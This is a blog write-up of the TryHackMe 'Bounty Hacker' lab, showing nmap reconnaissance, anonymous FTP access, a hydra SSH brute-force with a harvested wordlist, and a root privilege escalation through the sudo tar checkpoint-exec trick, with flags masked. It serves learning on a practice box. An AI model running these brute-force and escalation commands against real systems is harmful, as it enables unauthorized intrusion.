---
title: "Bounty_hacker.sh"
date: 2020-10-02T16:10:45-04:00
draft: false
toc: true
featured: false
summary: "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"
images:
  - "img/bountyHacker_cover.jpg"
cover: "img/bountyHacker_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---


## Bounty Hacker - THM Room

Hello interweb readers! I've felt like doing a quick box since I'm quite busy with work these days and its hard to find time to do longer boxes. Anyways, this time I went for 'Bounty Hacker' TryhackMe's room. This is a writeup detailing all my process to root this room, flaws and all. I embrace mistakes and try to learn from them, therefore this post also includes my failed attempts. You have been warned :) 

PS: The challenge was to have this box rooted and half documented at the very least during my lunch break and finish the quick writeup later today. Spoiler alert: I was able to, and I'm super happy about it.

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/cowboyhacker).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


### Recon: Nmap scan

We start as usual firing up nmap and running a scan, notice I initially tested the target to see if it responded to ping and it did. Otherwise, I would've added `-Pn` switch to nmap to avoid pinging the target. So I ran this: `sudo nmap -sV -sC -T4 -A -p- 10.10.38.249`

While nmap runs I usually open the target IP in the browser to see if anything is being served as a webpage:

Turns out we do have something, they are teasing us a bit with the story behind this room. Which seems related to the popular `Cowboy bebop` anime. Which also has AN AMAZING SOUNDTRACK!

![Page served](https://i.imgur.com/CTE4wsW.png)

Before we move to our friend `nmap` allow me to add some music to the post, I truly think Cowboy Bebop's OST is awesome. Let's hit play on this song and move on with the hacking:


> **SEATBELTS** - **Tank!** - **Cowboy Bebop OST** - **Written by Yoko Kanno**
> {{< youtube id="n2rVnRwW0h8" autoplay="false" >}}
> Crank that volume up!


Ok enough fooling around, let's see what that nmap scan returned:

```sh
sudo nmap -sV -sC -T4 -A -p- 10.10.38.249
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 13:10 EDT
Nmap scan report for 10.10.38.249
Host is up (0.33s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   226.02 ms 10.13.0.1
2   ... 3
4   364.92 ms 10.10.38.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1957.43 seconds
```

### FTP Access

One of the results we got brack from the nmap scan, is that the target has an FTP service with anonymous access enabled. Let's try that:

```sh
┌──(kali㉿kali)-[~/Documents/THM/bountyHacker]
└─$ ftp 10.10.38.249                                                              
Connected to 10.10.38.249.
220 (vsFTPd 3.0.3)
Name (10.10.38.249:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> 
```

It seems we have two files in the FTP server. We download both using `get {file_name}` command. If we then open both files we see some interesting data on each of them:

- **task.txt** : Mentions some task to be performed, and the message is signed by someone named `lin`
- **locks.txt** : Contains a list of possible usernames, or maybe passwords listed one-per-line.

Let's see if we can use that information next.


### Bruteforcing: hydra

At this point, I initially fired up hydra with the `locks.txt` as username list and `rockyou.txt` as the wordlist. That didn't work. Then I tried using the the user mentioned in the `task.txt` file `lin` and instead of using `rockyou.txt` as wordlist and I used `locks.txt` instead. That took a while but it worked:

We brute-force the SSH login using `lin` as username and the `locks.txt` file as the wordlist:

```sh
hydra -l lin -P locks.txt 10.10.38.249 ssh 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-02 15:52:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.38.249:22/
[22][ssh] host: 10.10.38.249   login: lin   password: THM{REDACTED_HAVE_FUN}
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-02 15:52:43
```

### SSH Access

Once `hydra` managed to brute-force his way in, we log in using lin's credentials and locate the `user.txt` flag. Which is conveniently located at the same directory we land after login.

```sh
┌──(kali㉿kali)-[~/Documents/THM/bountyHacker]
└─$ ssh lin@10.10.38.249                                                                                                                  
The authenticity of host '10.10.38.249 (10.10.38.249)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.38.249' (ECDSA) to the list of known hosts.
lin@10.10.38.249's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{REDACTED_HAVE_FUN}
lin@bountyhacker:~/Desktop$ 
```

### We check current user permissions

We need now, to see how we can escalate privileges so we can get the root flag. We start by checking what is the access level of the current user. We doe `sudo -l` to see if we have access to anything as sudo (root)

```sh
lin@bountyhacker:/tmp$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:/tmp$ 

```
It seems the user is allowed to run `tar` as root. Let's see if we find any way to exploit that. A good place to look is at GTFObins page.
They have an entry for `tar` [here](https://gtfobins.github.io/gtfobins/tar/).


We are offered a couple of options, the first one is trying to run this command: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` in our case since we know we can run `tar` as `sudo` we do that:

```sh
lin@bountyhacker:/tmp$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# 

```

And we got root, now we just need to locate the root.txt flag:

```sh
# cd root
# ls
root.txt
# cat root.txt
THM{REDACTED_HAVE_FUN}
# 

```

That's it. We rooted the box and with just enough time left on my lunch break so I can get some coffee before getting back to work.
I hope you enjoyed this quick room as I did.

Thank you and Happy hacking!

{{< thm_badge >}}